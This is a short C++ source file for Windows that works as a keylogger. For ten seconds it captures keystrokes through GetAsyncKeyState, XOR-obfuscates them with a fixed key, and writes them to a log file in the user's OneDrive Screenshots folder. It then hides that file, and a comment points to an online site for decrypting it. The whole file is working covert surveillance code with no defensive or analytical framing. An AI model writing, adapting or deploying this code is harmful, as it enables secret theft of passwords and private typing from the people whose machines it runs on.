#include <iostream>
#include <fstream>
#include <windows.h>
#include <ctime>
#include <lmcons.h>  // For UNLEN
#include <direct.h>  // For _mkdir
#include <cstdio>    // For remove()

using namespace std;

// Function to XOR encrypt/decrypt the data
string xorEncryptDecrypt(const string &data, const string &key) {
    string result = data;
    for (size_t i = 0; i < data.size(); ++i) {
        result[i] ^= key[i % key.size()];
    }
    return result;
}

int main() {
    ofstream logfile;
    int key;
    time_t start_time, current_time;

    // Get the username
    char username[UNLEN + 1]; // Buffer to hold the username
    DWORD username_len = UNLEN + 1; // Length of the buffer
    GetUserName(username, &username_len); // Retrieve the current username
   
    // Construct the full path for the log file in the OneDrive Pictures directory
    string logFilePath = "C:\\Users\\" + string(username) + "\\OneDrive\\Pictures\\Screenshots\\log.txt";

    if (remove(logFilePath.c_str()) == 0) {
        cout << "Previous log file deleted successfully.\n";
    }

    // Open the log file in truncation mode to create a new empty file
    logfile.open(logFilePath.c_str(), ios::trunc);
  
    time(&start_time);
    string loggedData; // Buffer to hold logged key data

    while (true) {
        time(&current_time);

        if (difftime(current_time, start_time) >= 10) {
            break;
        }

        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 1) {
                loggedData += static_cast<char>(key); // Store keys in loggedData buffer
            }
        }
    }

    // Encrypt the logged data using XOR
    string encryptedData = xorEncryptDecrypt(loggedData, "12345");

    // Write encrypted data to the log file
    logfile << encryptedData;
    logfile.close();

    // Hide the log file
    SetFileAttributes(logFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
     
	// Decryption at https://www.dcode.fr/xor-cipher
}
